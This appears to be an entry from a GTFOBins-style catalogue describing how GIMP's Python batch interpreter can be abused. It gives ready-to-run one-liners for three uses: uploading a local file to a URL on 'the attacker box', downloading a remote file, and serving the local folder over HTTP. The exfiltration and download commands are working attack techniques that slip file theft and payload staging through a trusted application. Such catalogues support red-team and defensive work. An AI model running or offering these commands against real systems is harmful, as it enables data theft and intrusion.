---
description: The binary hangs after executing the Python code and can be terminated pressing ``ctrl-c``.
functions:
  file-upload:
    - description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
        else: import urllib as u, urllib2 as r
        r.urlopen(e["$URL"], bytes(u.urlencode({"d":open(e["$LFILE"]).read()}).encode()))'
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r
        else: import urllib as r
        r.urlretrieve(e["$URL"], e["$LFILE"])'
  server:
    - description: Serve files in the local folder running an HTTP server.
      code: |
        gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
        if sys.version_info.major == 3: import http.server as s, socketserver as ss
        else: import SimpleHTTPServer as s, SocketServer as ss
        ss.TCPServer(("", int(e["$LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()'
---
